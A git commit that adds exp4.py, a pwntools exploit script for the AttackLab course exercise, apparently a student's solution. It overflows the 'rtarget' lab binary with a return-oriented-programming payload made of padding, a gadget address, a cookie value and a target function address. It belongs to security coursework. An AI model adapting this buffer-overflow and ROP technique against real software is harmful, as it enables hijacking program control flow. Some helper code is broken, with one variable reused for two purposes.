5f708defd618f78723163cc1a45bf123baa1d96f
leave-Devour <liyuechan@qq.com>
2021-02-07 10:30:51 +0800

    Second commit

---
+++ First_week/AttackLab/exp4.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+import sys
+context.log_level = 'debug'
+s       = lambda x                  :orda.send(str(x))
+sa      = lambda x, y                 :orda.sendafter(str(x),str(y)) 
+sl      = lambda x                   :orda.sendline(str(x)) 
+sla     = lambda x, y                 :orda.sendlineafter(str(x), str(y)) 
+r       = lambda numb=4096          :orda.recv(numb)
+rc        = lambda                     :orda.recvall()
+ru      = lambda x, drop=True          :orda.recvuntil(x, drop)
+rr        = lambda x                    :orda.recvrepeat(x)
+irt     = lambda                    :orda.interactive()
+uu32    = lambda x   :u32(x.ljust(4, '\x00'))
+uu64    = lambda x   :u64(x.ljust(8, '\x00'))
+db        = lambda    :raw_input()
+def getbase_b64(t):
+    pid=proc.pidof(s)[0]
+    pie_pwd ='/proc/'+str(pid)+'/maps'
+    f_pie=open(pie_pwd)
+    return f_pie.read()[:12]
+if len(sys.argv) > 1:
+    s = ""
+    host = s.split(":")[0]
+    port = int(s.split(":")[1])
+    orda = remote(host,port)
+else:
+    orda = process(["./rtarget","-q"])
+cookie = 0x59b997fa
+
+payload = 'a'*0x28+p64(0x000000000040141b)+p64(cookie)+p64(0x4017EC)
+ru("\n")
+sl(payload)
+irt()
